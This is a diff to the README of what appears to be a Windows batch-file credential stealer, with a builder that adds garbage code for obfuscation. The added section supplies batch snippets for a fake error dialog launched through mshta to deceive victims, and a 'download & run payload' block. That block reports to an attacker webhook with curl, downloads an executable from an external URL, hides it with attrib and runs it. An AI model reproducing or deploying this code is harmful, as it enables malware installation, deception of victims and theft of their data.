@@ -33,15 +33,6 @@
 * Just changing the webhook and doing nothing else. 
   * If the batch file does nothing the user will open it to see what's wrong.
 
-# Manual features that can be added
-
-Fake error message
-```batch
-if not "%~dp0"=="%vpath%\" (
-start /min /b mshta vbscript:Execute("Msgbox(""Bodytext""+vbCrLf+vbCrLf+""Anotherbody""),16,""Titletext"":window.close")
-)
-```
-
 # Features
 
 ### 💉 Steals
@@ -124,6 +115,48 @@ start /min /b mshta vbscript:Execute("Msgbox(""Bodytext""+vbCrLf+vbCrLf+""Anothe
   * Save.dat
 </details>
 
+## Other manually addable features
+
+Fake error message
+```batch
+set "vpath="
+
+...
+
+if not "%~dp0"=="%vpath%\" (
+start /min /b mshta vbscript:Execute("Msgbox(""Bodytext""+vbCrLf+vbCrLf+""Anotherbody""),16,""Titletext"":window.close")
+)
+
+...
+```
+
+Download & run payload
+```batch
+set "vpath="
+set "webhook="
+
+cd %vpath%
+...
+
+:: PAYLOAD - REMOVE GOTO IF YOU WANT THE SCRIPT TO DOWNLOAD AND RUN A FILE SOMEWHERE
+:: ----------------------------------------------------------------------------------
+goto skipcustomdownload
+	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Downloading and starting a custom file from\n%customdownloadurl% to %vpath%\%customfilename%```\"}" %webhook%
+	set "customdownloadurl=https://external.ext/file.exe"
+        set "customfilename=c.exe"
+	IF EXIST "%customfilename%" GOTO waitloop4
+	curl --silent -L --fail "%customdownloadurl%" -o "%customfilename%"
+	>NUL attrib "%vpath%\%customfilename%" +h
+	:waitloop4
+	IF EXIST "%customfilename%" GOTO waitloopend4
+	timeout /t 5 /nobreak > NUL
+	:waitloopend4
+	2> NUL start "%customfilename%"
+:skipcustomdownload
+
+...
+```
+
 ### 📑 Other features 
 
   * Delete itself after execution
@@ -136,7 +169,8 @@ start /min /b mshta vbscript:Execute("Msgbox(""Bodytext""+vbCrLf+vbCrLf+""Anothe
     * Ability to target specific users (Check username)
     
   * Take screenshot
-    
+
+
 #### Included on the [Automatic Builder](https://github.com/Takaovi/BSBuilder)
   * Add garbage code (Confuse/Fill)
 
